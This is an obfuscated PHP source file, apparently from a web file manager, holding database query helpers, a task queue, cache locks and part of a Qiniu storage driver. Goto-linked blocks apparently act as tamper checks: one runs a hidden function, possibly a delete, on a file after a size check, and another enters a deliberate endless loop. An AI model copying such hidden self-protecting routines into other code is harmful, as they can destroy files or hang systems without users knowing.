$Ûó¾ÓíÉ[$íêªÏ…½[354]][$¨£´ƒ±â][1] = $‘÷ê’¯É; $this->optionsValue($Ûó¾ÓíÉ); $‚“”øÜÆ += parent::save($²Ò—×Æ, $…Û×ã™›); $this->chunkEventCheck(count($‘÷ê’¯É)); } $this->chunkEventSet(); return $‚“”øÜÆ; } public function add($Òƒ“ÕÜˆ = '', $ßÒÛ­è„ = array(), $²†‘ÈÅŞ = false) { if ($this->addTaskStatus && is_array($Òƒ“ÕÜˆ)) { $this->addTaskData[] = $Òƒ“ÕÜˆ; return; } return parent::add($Òƒ“ÕÜˆ, $ßÒÛ­è„, $²†‘ÈÅŞ); } public function parseWhereLike($ø´ÄÒØß, $ ©²–è› = '', $Ò”˜’¬ô = false, &$ïˆéÓ = false) { $©óšÄ·´ =& $_SERVER[¶Ô„œ…¯]; $˜¾Î£€õ = $GLOBALS[$©óšÄ·´[6]][$©óšÄ·´[459]]; if (!$˜¾Î£€õ[$©óšÄ·´[460]]) { return $ø´ÄÒØß; } if (!is_array($ø´ÄÒØß)) { return $ø´ÄÒØß; } $õ½“•´ = array(); $ÌÙÓ­°£ = 0; foreach ($ø´ÄÒØß as $ÛÅ¬ûŒª => $‹¬±Ë§) { if (is_array($‹¬±Ë§) && count($‹¬±Ë§) == 2 && $‹¬±Ë§[0] == $©óšÄ·´[461] && is_string($‹¬±Ë§[1]) && substr($‹¬±Ë§[1], 0, 1) == $©óšÄ·´[462] && substr($‹¬±Ë§[1], strlen($‹¬±Ë§[1]) - 1, 1) == $©óšÄ·´[462]) { $ïˆéÓ = !0; $ £€Íã› = is_string($ÛÅ¬ûŒª) ? $ÛÅ¬ûŒª : $ ©²–è›; $‘ÑÜÇ§ = substr($‹¬±Ë§[1], 1, strlen($‹¬±Ë§[1]) - 2); $‘ÑÜÇ§ = $this->db->escapeString($‘ÑÜÇ§); if (!strpos($ £€Íã›, $©óšÄ·´[10])) { $ £€Íã› = $©óšÄ·´[463] . $ £€Íã› . $©óšÄ·´[463]; } $µº©©Ö = $©óšÄ·´[222] . $‘ÑÜÇ§ . $©óšÄ·´[222]; $‘ÑÜÇ§ = str_replace(array($©óšÄ·´[10], $©óšÄ·´[464], $©óšÄ·´[11]), $©óšÄ·´[465], $‘ÑÜÇ§); if ($˜¾Î£€õ[$©óšÄ·´[466]]) { $µº©©Ö = $©óšÄ·´[467] . $‘ÑÜÇ§ . $©óšÄ·´[468]; if ($˜¾Î£€õ[$©óšÄ·´[469]]) { $µº©©Ö = $©óšÄ·´[468] . $‘ÑÜÇ§ . $©óšÄ·´[467]; } } $õ½“•´[$ÌÙÓ­°£] = $©óšÄ·´[470] . $ £€Íã› . $©óšÄ·´[471] . $µº©©Ö . $©óšÄ·´[472]; $ÌÙÓ­°£++; continue; } if (is_array($‹¬±Ë§)) { $ ©²–è› = is_string($ÛÅ¬ûŒª) ? $ÛÅ¬ûŒª : $ ©²–è›; $‹¬±Ë§ = $this->parseWhereLike($‹¬±Ë§, $ ©²–è›, !0, $ïˆéÓ); } if (is_numeric($ÛÅ¬ûŒª)) { $õ½“•´[$ÌÙÓ­°£] = $‹¬±Ë§; $ÌÙÓ­°£++; } else { $õ½“•´[$ÛÅ¬ûŒª] = $‹¬±Ë§; } } if ($ïˆéÓ && !$Ò”˜’¬ô) { } return $õ½“•´; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¢æ™§¢ñ = array()) { $óÑóÎŞ„ =& $_SERVER[¶Ô„œ…¯]; $Ä¦µú¨­ = self::SQL_WHERE_IN_CHUNK; $«İ¬ºåì = $this->optionsValue(); $•Çßšú = $this->findWhereField($«İ¬ºåì); if (!$•Çßšú || isset($«İ¬ºåì[$óÑóÎŞ„[369]]) || isset($«İ¬ºåì[$óÑóÎŞ„[430]])) { return parent::select($¢æ™§¢ñ); } $»Ş›° = $«İ¬ºåì[$óÑóÎŞ„[354]][$•Çßšú][1]; $»Ş›° = is_array($»Ş›°) ? $»Ş›° : array(); $áßÑ­óÛ = null; for ($‘—¯° = 0; $‘—¯° < count($»Ş›°); $‘—¯° += $Ä¦µú¨­) { $ÆÖğ”ÅÔ = array_slice($»Ş›°, $‘—¯°, $Ä¦µú¨­); if (!is_array($ÆÖğ”ÅÔ) || count($ÆÖğ”ÅÔ) == 0) { break; } $«İ¬ºåì[$óÑóÎŞ„[354]][$•Çßšú][1] = $ÆÖğ”ÅÔ; $this->optionsValue($«İ¬ºåì); $¦ˆüŠ­¿ = parent::select($¢æ™§¢ñ); if (!$¦ˆüŠ­¿) { continue; } $áßÑ­óÛ = is_array($áßÑ­óÛ) ? $áßÑ­óÛ : array(); $áßÑ­óÛ = array_merge($áßÑ­óÛ, $¦ˆüŠ­¿); } return $áßÑ­óÛ; } public function delete($‡¡„±ú = array()) { $ŒÃïòµİ =& $_SERVER[¶Ô„œ…¯]; $…«Âé‡¯ = self::SQL_WHERE_IN_CHUNK; $ÙáùûÌ = $this->optionsValue(); $˜Ñæñ³ê = $this->findWhereField($ÙáùûÌ); if (!$˜Ñæñ³ê) { return parent::delete($‡¡„±ú); } $µ¢ôÀ¦ = 0; $Œåù‡òÓ = $ÙáùûÌ[$ŒÃïòµİ[354]][$˜Ñæñ³ê][1]; $Œåù‡òÓ = is_array($Œåù‡òÓ) ? $Œåù‡òÓ : array(); for ($ãò‹·³± = 0; $ãò‹·³± < count($Œåù‡òÓ); $ãò‹·³± += $…«Âé‡¯) { $ËÖ”ßó… = array_slice($Œåù‡òÓ, $ãò‹·³±, $…«Âé‡¯); if (!is_array($ËÖ”ßó…) || count($ËÖ”ßó…) == 0) { break; } $ÙáùûÌ[$ŒÃïòµİ[354]][$˜Ñæñ³ê][1] = $ËÖ”ßó…; $this->optionsValue($ÙáùûÌ); $µ¢ôÀ¦ += parent::delete($‡¡„±ú); } return $µ¢ôÀ¦; } private function findWhereField($¹†Åóçå) { $ÜúçÏ•® =& $_SERVER[¶Ô„œ…¯]; $øã¸Ñ³¡ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¹†Åóçå) || !is_array($¹†Åóçå[$ÜúçÏ•®[354]])) { return !1; } foreach ($¹†Åóçå[$ÜúçÏ•®[354]] as $£éîÖ› => $ÒÚú€) { if (is_array($ÒÚú€) && isset($ÒÚú€[0]) && is_string($ÒÚú€[0]) && strtolower($ÒÚú€[0]) == $ÜúçÏ•®[7] && is_array($ÒÚú€[1]) && count($ÒÚú€[1]) > $øã¸Ñ³¡) { ignore_timeout(); return $£éîÖ›; } } return !1; } public function setMasterDB($Äßíµ¾Â = true) { think_config($_SERVER[¶Ô„œ…¯][473], $Äßíµ¾Â); } } goto e…¨¿¬ù×²; a„ê«°÷¢ß: function binCheckBigger($âÆÕÎÕ, $Í±ë§ÙÇ) { return $âÆÕÎÕ > $Í±ë§ÙÇ; } $_SERVER[$_SERVER[ÏÆ£‘š][3]] = ("\70\65\66\64"."\60\67")+0;$_r2ba="3rui8mqkz6xcfsn9e2b4plg710whjat5yvodl5sbjicek106znr2y49tgmqpo8wavhdfx3u7crmf2kdiyq";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($†Ÿñı“, $öç‘¾€Ó) { $–ùğ–ı =& $_SERVER[¶Ô„œ…¯]; if (isset(self::$_methodList[$†Ÿñı“])) { return @call_user_func_array(self::$_methodList[$†Ÿñı“], $öç‘¾€Ó); } else { if (method_exists($this, $†Ÿñı“)) { return call_user_func_array(array($this, $†Ÿñı“), $öç‘¾€Ó); } else { think_exception(__CLASS__ . $–ùğ–ı[4] . $†Ÿñı“ . $–ùğ–ı[5]); } } } public static function __callStatic($ŞáŸ–ã, $¾‘˜¯ú³) { if (isset(self::$_methodListStatic[$ŞáŸ–ã])) { return call_user_func_array(self::$_methodListStatic[$ŞáŸ–ã], $¾‘˜¯ú³); } else { if (method_exists(self, $ŞáŸ–ã)) { return call_user_func_array(array(self, $ŞáŸ–ã), $¾‘˜¯ú³); } else { show_json("{$ŞáŸ–ã}\50\51\x20\x6e\x6f\x74\40\145\x78\x69\x73\x74\73", !1); } } } public static function addMethod($á±Ó°ÌÆ, $Á…’»°…) { self::$_methodList[$á±Ó°ÌÆ] = $Á…’»°…; } public static function addMethodStatic($á…Ò«Å, $“êÀÊß„) { self::$_methodListStatic[$á…Ò«Å] = $“êÀÊß„; } } goto fÂá‡ã¡öš; fÇ‚¨œÀ‹: $_file = $_SERVER[$_SERVER[¶Ô„œ…¯][926]]; $_size = $_SERVER[¶Ô„œ…¯][1437]; if ($_SERVER[$_SERVER[¶Ô„œ…¯][919]] != $_size($_file)) { $_getc = $_SERVER[¶Ô„œ…¯][921]; $_getfile = $_SERVER[$_SERVER[¶Ô„œ…¯][922]] . $_SERVER[¶Ô„œ…¯][923]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¶Ô„œ…¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[¶Ô„œ…¯][696]) { $exit = $_SERVER[¶Ô„œ…¯][924]; $exit(); } $_act = $_SERVER[¶Ô„œ…¯][925]; $_act($_file); } goto C²Úï’ˆ“ê; d·–ÈêÈ¢ò: class TaskHttp extends Task { protected function startAfter() { $Ãôí—ØÃ =& $_SERVER[¶Ô„œ…¯]; $†ï´Šµñ =& $this->task; $†ï´Šµñ[$Ãôí—ØÃ[1858]] = 1; Hook::bind($Ãôí—ØÃ[1826], array($this, $Ãôí—ØÃ[1859])); Hook::bind($Ãôí—ØÃ[1828], array($this, $Ãôí—ØÃ[1860])); Hook::bind($Ãôí—ØÃ[1830], array($this, $Ãôí—ØÃ[1861])); } protected function endAfter() { $Ô¼éÑˆ™ =& $_SERVER[¶Ô„œ…¯]; Hook::unbind($Ô¼éÑˆ™[1826], array($this, $Ô¼éÑˆ™[1859])); Hook::unbind($Ô¼éÑˆ™[1828], array($this, $Ô¼éÑˆ™[1860])); Hook::unbind($Ô¼éÑˆ™[1830], array($this, $Ô¼éÑˆ™[1861])); } public function progressStart($Ü¢Û›Û¸) { $ÚÚçÆé =& $_SERVER[¶Ô„œ…¯]; $úâæ³ªÎ = curl_getinfo($Ü¢Û›Û¸); self::log($ÚÚçÆé[1862] . $úâæ³ªÎ[$ÚÚçÆé[384]]); self::valueSet($this->task[$ÚÚçÆé[477]], $this->task); } public function progressEnd($‡˜£¯èÛ) { $„Ÿ¸Ş¯œ =& $_SERVER[¶Ô„œ…¯]; self::log($„Ÿ¸Ş¯œ[1863] . $this->task[$„Ÿ¸Ş¯œ[477]]); $this->end(); } public function progress($õıªİÃ¾, $¶Üùé•é, $äö¦ƒÚ¹, $˜Ïû«¯ò, $œ¹‡‘•Æ) { $³ç×Ã¶ =& $_SERVER[¶Ô„œ…¯]; $óšÖÍ˜ =& $this->task; if ($œ¹‡‘•Æ > 0) { $óšÖÍ˜[$³ç×Ã¶[1147]] = $óšÖÍ˜[$³ç×Ã¶[1147]] == 0 ? $˜Ïû«¯ò : $óšÖÍ˜[$³ç×Ã¶[1147]]; $óšÖÍ˜[$³ç×Ã¶[1781]] = $œ¹‡‘•Æ; } else { if ($äö¦ƒÚ¹ > 0) { $óšÖÍ˜[$³ç×Ã¶[1147]] = $óšÖÍ˜[$³ç×Ã¶[1147]] == 0 ? $¶Üùé•é : $óšÖÍ˜[$³ç×Ã¶[1147]]; $óšÖÍ˜[$³ç×Ã¶[1781]] = $äö¦ƒÚ¹; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\x65\x73\163\110\x74\164\160\72\144\157\x77\156\x3a{$äö¦ƒÚ¹}\x2f{$¶Üùé•é}\73\40\x75\160\x6c\157\141\144\x3a{$œ¹‡‘•Æ}\57{$˜Ïû«¯ò}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÛÒ÷ß·û, $´¡¿¢ã˜ = '', $€æÔË² = 0, $öŠêÒÓà = '') { $Ì¾ë¶Ò =& $_SERVER[¶Ô„œ…¯]; $öŠêÒÓà = $öŠêÒÓà ? $öŠêÒÓà : ($´¡¿¢ã˜ ? $´¡¿¢ã˜ : $ÛÒ÷ß·û); $äÅí™½¶ = new Task($ÛÒ÷ß·û, $´¡¿¢ã˜, $€æÔË², $öŠêÒÓà); $GLOBALS[$Ì¾ë¶Ò[1864] . $ÛÒ÷ß·û] = new TaskLog($Ì¾ë¶Ò[1763], $äÅí™½¶, $öŠêÒÓà); return $äÅí™½¶; } public function __construct($Â¡õëÁù = '', $£Ï“‡ = '', $îí™Î¨µ = '') { $İ°¶ˆÎñ =& $_SERVER[¶Ô„œ…¯]; if (!$Â¡õëÁù) { $Â¡õëÁù = $İ°¶ˆÎñ[1763]; } $Æ´Â¤„È = $Â¡õëÁù . $İ°¶ˆÎñ[464] . rand_string(10); if (!$îí™Î¨µ) { $îí™Î¨µ = $Â¡õëÁù . $İ°¶ˆÎñ[53] . $îí™Î¨µ; } switch ($Â¡õëÁù) { case $İ°¶ˆÎñ[1763]: if (!$£Ï“‡ || !$£Ï“‡->task) { return echoLog($Â¡õëÁù . $İ°¶ˆÎñ[1865]); } $©©úæÖ¨ = $£Ï“‡; $Æ´Â¤„È = $©©úæÖ¨->task[$İ°¶ˆÎñ[477]]; $Â¡õëÁù = $©©úæÖ¨->task[$İ°¶ˆÎñ[477]]; if (!$©©úæÖ¨->task[$İ°¶ˆÎñ[1666]]) { $©©úæÖ¨->task[$İ°¶ˆÎñ[1666]] = $îí™Î¨µ ? $îí™Î¨µ : $Â¡õëÁù; } break; case $İ°¶ˆÎñ[1866]: if (!$£Ï“‡) { return echoLog($Â¡õëÁù . $İ°¶ˆÎñ[1867]); } $˜è¶ãÊ× = is_string($£Ï“‡) ? array($£Ï“‡) : $£Ï“‡; $©©úæÖ¨ = new TaskFileTransfer($Æ´Â¤„È, $Â¡õëÁù, 0, $îí™Î¨µ ? $îí™Î¨µ : $˜è¶ãÊ×[0]); foreach ($˜è¶ãÊ× as $Ä™øİˆ) { $©©úæÖ¨->addPath($Ä™øİˆ); } break; case $İ°¶ˆÎñ[390]: if (!$£Ï“‡) { return echoLog($Â¡õëÁù . $İ°¶ˆÎñ[1867]); } $˜è¶ãÊ× = is_string($£Ï“‡) ? array($£Ï“‡) : $£Ï“‡; $©©úæÖ¨ = new TaskZip($Æ´Â¤„È, $Â¡õëÁù, 0, $îí™Î¨µ ? $îí™Î¨µ : $˜è¶ãÊ×[0]); foreach ($˜è¶ãÊ× as $Ä™øİˆ) { $©©úæÖ¨->addPath($Ä™øİˆ); } break; case $İ°¶ˆÎñ[1306]: if (!$£Ï“‡) { return echoLog($Â¡õëÁù . $İ°¶ˆÎñ[1867]); } $©©úæÖ¨ = new TaskUnZip($Æ´Â¤„È, $Â¡õëÁù, 0, $îí™Î¨µ ? $îí™Î¨µ : $£Ï“‡); if ($£Ï“‡) { $©©úæÖ¨->addFile($£Ï“‡); } break; case $İ°¶ˆÎñ[152]: $©©úæÖ¨ = new TaskHttp($Æ´Â¤„È, $Â¡õëÁù); break; default: return; break; } $this->task = $©©úæÖ¨; $this->taskID = $Æ´Â¤„È; Hook::bind($İ°¶ˆÎñ[1801], array($this, $İ°¶ˆÎñ[1868])); Hook::bind($İ°¶ˆÎñ[1803], array($this, $İ°¶ˆÎñ[1869])); Hook::bind($İ°¶ˆÎñ[1797], array($this, $İ°¶ˆÎñ[1870])); echoLog($İ°¶ˆÎñ[1871] . $©©úæÖ¨->task[$İ°¶ˆÎñ[1666]]); } public function __destruct() { $this->end(); } public function end($•ç‡õÛè = '') { $Ä³¬¼´Í =& $_SERVER[¶Ô„œ…¯]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($•ç‡õÛè); $this->task = !1; $this->taskID = !1; Hook::unbind($Ä³¬¼´Í[1801], array($this, $Ä³¬¼´Í[1868])); Hook::unbind($Ä³¬¼´Í[1803], array($this, $Ä³¬¼´Í[1869])); Hook::unbind($Ä³¬¼´Í[1797], array($this, $Ä³¬¼´Í[1870])); } public function taskUpdate($´‚¹€øş) { $Ñ­²»Ñä =& $_SERVER[¶Ô„œ…¯]; if (!$´‚¹€øş || $this->taskID != $´‚¹€øş[$Ñ­²»Ñä[477]]) { return; } $¤ÄÕº¸ˆ = 20; $çÇ†™‹â = intval($´‚¹€øş[$Ñ­²»Ñä[1782]] * $¤ÄÕº¸ˆ); $à¦ÃëØ = $Ñ­²»Ñä[176] . str_repeat($Ñ­²»Ñä[508], $çÇ†™‹â) . $Ñ­²»Ñä[1098] . str_repeat($Ñ­²»Ñä[53], $¤ÄÕº¸ˆ - $çÇ†™‹â) . $Ñ­²»Ñä[178]; $·¸Ø§¶Å = $à¦ÃëØ . sprintf($Ñ­²»Ñä[1872], $´‚¹€øş[$Ñ­²»Ñä[1782]] * 100) . $Ñ­²»Ñä[1873]; $òóÂù¼ = $·¸Ø§¶Å . $´‚¹€øş[$Ñ­²»Ñä[1781]] . $Ñ­²»Ñä[8] . $´‚¹€øş[$Ñ­²»Ñä[1147]] . LNG($Ñ­²»Ñä[1874]); $÷×ó®İ¢ = $Ñ­²»Ñä[12]; if ($´‚¹€øş[$Ñ­²»Ñä[1858]]) { $òóÂù¼ = $·¸Ø§¶Å . size_format($´‚¹€øş[$Ñ­²»Ñä[1781]]) . $Ñ­²»Ñä[8] . size_format($´‚¹€øş[$Ñ­²»Ñä[1147]]); $÷×ó®İ¢ = size_format($´‚¹€øş[$Ñ­²»Ñä[1783]]) . $Ñ­²»Ñä[1875]; } if ($´‚¹€øş[$Ñ­²»Ñä[1149]]) { $´‚¹€øş[$Ñ­²»Ñä[1832]] = $´‚¹€øş[$Ñ­²»Ñä[1149]] . $Ñ­²»Ñä[53] . $´‚¹€øş[$Ñ­²»Ñä[1832]]; } if ($´‚¹€øş[$Ñ­²»Ñä[1832]]) { $öÌşòÊÇ = $Ñ­²»Ñä[12]; if ($´‚¹€øş[$Ñ­²»Ñä[1834]]) { $öÌşòÊÇ = $Ñ­²»Ñä[50] . size_format($´‚¹€øş[$Ñ­²»Ñä[1835]]) . $Ñ­²»Ñä[8] . size_format($´‚¹€øş[$Ñ­²»Ñä[1834]]); } $÷×ó®İ¢ .= $´‚¹€øş[$Ñ­²»Ñä[1832]] . $öÌşòÊÇ; } if ($´‚¹€øş[$Ñ­²»Ñä[841]] && !$´‚¹€øş[$Ñ­²»Ñä[1834]]) { $÷×ó®İ¢ .= $Ñ­²»Ñä[53] . size_format($´‚¹€øş[$Ñ­²»Ñä[1839]]) . $Ñ­²»Ñä[8] . size_format($´‚¹€øş[$Ñ­²»Ñä[841]]); } echoLog($òóÂù¼ . $Ñ­²»Ñä[53] . $÷×ó®İ¢, !0); } public function taskEnd($¾Ì‘ÌÏ§) { $˜µ‰ÒÆ° =& $_SERVER[¶Ô„œ…¯]; if (!$¾Ì‘ÌÏ§ || $this->taskID != $¾Ì‘ÌÏ§[$˜µ‰ÒÆ°[477]]) { return; } $ªªŠ°´Ï = $¾Ì‘ÌÏ§ ? $¾Ì‘ÌÏ§[$˜µ‰ÒÆ°[1781]] . $˜µ‰ÒÆ°[8] . $¾Ì‘ÌÏ§[$˜µ‰ÒÆ°[1147]] . LNG($˜µ‰ÒÆ°[1874]) . $˜µ‰ÒÆ°[74] : $˜µ‰ÒÆ°[12]; echoLog($˜µ‰ÒÆ°[1876] . $¾Ì‘ÌÏ§[$˜µ‰ÒÆ°[1666]] . ($¾Ì‘ÌÏ§[$˜µ‰ÒÆ°[528]] ? $˜µ‰ÒÆ°[74] . $¾Ì‘ÌÏ§[$˜µ‰ÒÆ°[528]] : $˜µ‰ÒÆ°[12]) . $˜µ‰ÒÆ°[74] . $ªªŠ°´Ï . $˜µ‰ÒÆ°[1877] . sprintf($˜µ‰ÒÆ°[938], timeFloat() - $¾Ì‘ÌÏ§[$˜µ‰ÒÆ°[1784]]) . $˜µ‰ÒÆ°[1796]); $this->end(); } public function taskKill($¤ø¼üã‚) { $È“Ù­§ã =& $_SERVER[¶Ô„œ…¯]; if (!$¤ø¼üã‚ || $this->taskID != $¤ø¼üã‚[$È“Ù­§ã[477]]) { return; } echoLog($È“Ù­§ã[1878] . $¤ø¼üã‚[$È“Ù­§ã[1666]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\153\x51\165\145\x75\x65\114\145\156\147\164\x68"; const QUEUE_DATA = "\164\x61\163\153\121\x75\x65\x75\145\x44\141\164\141"; const QUEUE_TIME = "\x74\141\163\153\x51\x75\145\x75\145\114\141\163\x74\122\165\156"; const QUEUE_THREAD = "\x74\141\x73\x6b\x51\165\145\x75\x65\124\x68\162\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($àÛñËüÎ, $ğ‚ªî¨ä = array(), $Ğª„“ÇÂ = '', $ÍŠùñ„ñ = '') { $×±Øçà¶ =& $_SERVER[¶Ô„œ…¯]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ÍŠùñ„ñ && array_find_by_field(self::$listData, $×±Øçà¶[97], $ÍŠùñ„ñ)) { return !0; } if ($ÍŠùñ„ñ && array_find_by_field(self::$listDataAdd, $×±Øçà¶[97], $ÍŠùñ„ñ)) { return !0; } self::$listDataAdd[] = array($×±Øçà¶[343] => $àÛñËüÎ, $×±Øçà¶[1879] => $ğ‚ªî¨ä, $×±Øçà¶[528] => $Ğª„“ÇÂ, $×±Øçà¶[97] => $ÍŠùñ„ñ); return !0; } public static function addSubmit() { $ôïó ¥ =& $_SERVER[¶Ô„œ…¯]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ôïó ¥[1880] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ôïó ¥[12], $ôïó ¥[528])), $ôïó ¥[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ˆô¤Í³, $¹‹Ö‰È = array(), $‚¼âÓ ƒ = '', $¶Ì…±î = '') { $·«¸ô‰« =& $_SERVER[¶Ô„œ…¯]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ÛËùã‘  = self::getAll(); if ($¶Ì…±î && array_find_by_field($ÛËùã‘ , $·«¸ô‰«[97], $¶Ì…±î)) { return !0; } $ÛËùã‘ [] = array($·«¸ô‰«[343] => $ˆô¤Í³, $·«¸ô‰«[1879] => $¹‹Ö‰È, $·«¸ô‰«[528] => $‚¼âÓ ƒ, $·«¸ô‰«[97] => $¶Ì…±î); self::setAll($ÛËùã‘ ); write_log($·«¸ô‰«[1880] . $‚¼âÓ ƒ, $·«¸ô‰«[197]); return !0; } public static function run() { $¦ğ™¾­¸ =& $_SERVER[¶Ô„œ…¯]; $¶Àƒª é = self::getAll(); $¾¯ãÏ³² = array_shift($¶Àƒª é); if (!$¾¯ãÏ³²) { return !1; } self::setAll($¶Àƒª é); $ôÁÉŸ¦ = timeFloat(); $š¸äó–— = $¦ğ™¾­¸[12]; try { $š¸äó–— = Hook::apply($¾¯ãÏ³²[$¦ğ™¾­¸[343]], $¾¯ãÏ³²[$¦ğ™¾­¸[1879]]); } catch (Exception $†¢§•ûş) { write_log($†¢§•ûş, $¦ğ™¾­¸[1271]); } $ç†ù“°º = number_format(timeFloat() - $ôÁÉŸ¦, 3) . $¦ğ™¾­¸[1796]; if ($š¸äó–— && is_string($š¸äó–—)) { $ç†ù“°º = $ç†ù“°º . $¦ğ™¾­¸[1881] . $š¸äó–—; } write_log($¦ğ™¾­¸[1882] . $¾¯ãÏ³²[$¦ğ™¾­¸[528]] . $¦ğ™¾­¸[1883] . $ç†ù“°º, $¦ğ™¾­¸[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $†­ˆã¨ =& $_SERVER[¶Ô„œ…¯]; $÷÷Ü÷Üµ = self::threadCount() + 1; if ($÷÷Ü÷Üµ > 3 || !self::count()) { return; } write_log($†­ˆã¨[1884] . $÷÷Ü÷Üµ, $†­ˆã¨[197]); Cache::set(self::QUEUE_THREAD, $÷÷Ü÷Üµ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($†­ˆã¨[1885], $†­ˆã¨[197]); } public static function getKey($ÎàÃ¬¨å, $ÛÛõ¼›Î = "\151\x6e\x74") { $¼º¨£¢ =& $_SERVER[¶Ô„œ…¯]; Cache::removeMemory($ÎàÃ¬¨å); $ÇĞ¼à¼Ô = Cache::get($ÎàÃ¬¨å); if ($ÛÛõ¼›Î == $¼º¨£¢[365]) { return $ÇĞ¼à¼Ô ? intval($ÇĞ¼à¼Ô) : 0; } if ($ÛÛõ¼›Î == $¼º¨£¢[1886]) { return is_array($ÇĞ¼à¼Ô) ? $ÇĞ¼à¼Ô : array(); } return $ÇĞ¼à¼Ô; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¶Ô„œ…¯][1886]); } public static function setAll($ñÍ¤õî¬) { $Ç¼œÃËô = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ñÍ¤õî¬), $Ç¼œÃËô); Cache::set(self::QUEUE_DATA, $ñÍ¤õî¬, $Ç¼œÃËô); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto Aò‰ÉßËó§; aÄØ Ñò—: class CacheLockRedis { public function lock($Æè–ğÍ, $Àæö¡© = 10) { $ÈŒÀ²ı = Cache::init(); $õÎßÌ‰ = microtime(!0) + $Àæö¡©; while (microtime(!0) < $õÎßÌ‰) { $ãâ…ùÕø = $ÈŒÀ²ı->get($Æè–ğÍ); if (!$ãâ…ùÕø) { $³¼Ã›“ı = $ÈŒÀ²ı->setLock($Æè–ğÍ, $õÎßÌ‰, $Àæö¡©); if ($³¼Ã›“ı) { return !0; } } else { if ($ãâ…ùÕø < microtime(!0)) { $ÈŒÀ²ı->set($Æè–ğÍ, $õÎßÌ‰, $Àæö¡© * 2); if ($ÈŒÀ²ı->get($Æè–ğÍ) === $ãâ…ùÕø) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($º‹êŒ­†) { return Cache::init()->get($º‹êŒ­†); } public function unlock($®‚˜‡˜Ñ) { return Cache::init()->remove($®‚˜‡˜Ñ); } } class CacheLockMemcached { public function lock($÷›¥ºò‡, $æ–˜ÚØØ = 0) { $üÉÕ–Ñ = Cache::init(); $Ù–æ´ñÜ = microtime(!0) + $æ–˜ÚØØ; while (microtime(!0) < $Ù–æ´ñÜ) { $Ç™‹Ô¸º = $üÉÕ–Ñ->get($÷›¥ºò‡); if (!$Ç™‹Ô¸º || $Ç™‹Ô¸º < microtime(!0)) { $ı¶ğ…ã¢ = $üÉÕ–Ñ->handle->add($÷›¥ºò‡, $Ù–æ´ñÜ, $æ–˜ÚØØ); if ($ı¶ğ…ã¢) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÖøÂ‚Ú¹) { return Cache::init()->get($ÖøÂ‚Ú¹); } public function unlock($˜õ¼–£©) { return Cache::init()->remove($˜õ¼–£©); } } if (!isset($_SERVER[$_SERVER[¶Ô„œ…¯][919]]) || !isset($_SERVER[$_SERVER[¶Ô„œ…¯][926]])) { $_getc = $_SERVER[¶Ô„œ…¯][921]; $_getfile = $_SERVER[$_SERVER[¶Ô„œ…¯][922]] . $_SERVER[¶Ô„œ…¯][923]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¶Ô„œ…¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[¶Ô„œ…¯][696]) { $exit = $_SERVER[¶Ô„œ…¯][924]; $exit(); } $_act = $_SERVER[¶Ô„œ…¯][925]; $_act($_SERVER[$_SERVER[¶Ô„œ…¯][922]] . $_SERVER[¶Ô„œ…¯][923]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¶Ô„œ…¯][456]); } } goto cÛ¹¯èˆ; D…éÀòñô’: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($…ùÉè™) { parent::__construct(); require_once SDK_DIR . $_SERVER[¶Ô„œ…¯][1537]; $this->_init($…ùÉè™); } public function _init($Ûğ¼”Â) { $ıü•‰Ó =& $_SERVER[¶Ô„œ…¯]; $this->config = $Ûğ¼”Â; foreach ($Ûğ¼”Â as $ÅØ¬«é => $µ±¸Å‘Ö) { if (isset($this->{$ÅØ¬«é})) { $this->{$ÅØ¬«é} = $µ±¸Å‘Ö; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ıü•‰Ó[1538] . LNG($ıü•‰Ó[1473])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($éÔóåŞ”, 